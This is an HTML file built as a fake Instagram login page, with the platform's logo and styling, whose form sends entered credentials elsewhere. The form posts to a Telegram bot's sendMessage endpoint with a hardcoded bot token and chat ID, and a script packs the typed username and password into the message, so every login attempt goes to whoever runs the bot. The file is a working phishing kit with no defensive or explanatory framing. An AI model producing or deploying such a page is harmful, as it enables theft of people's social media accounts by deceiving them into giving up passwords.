<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 300px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .login-container img {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #318ce7;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
    <form action="https://api.telegram.org/bot<5215197060:AAEjo6D6jvXRqnVy6a9L2gjbvfL8myyh-XE>/sendMessage" method="POST">
        <input type="hidden" name="chat_id" value="<1900509620>">
        <input type="hidden" name="text" id="message">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" onclick="sendTelegram()">Log In</button>
    </form>
</div>

<script>
    function sendTelegram() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        document.getElementById('message').value = "Username: " + username + "\\nPassword: " + password;
    }
</script>

</body>
</html>
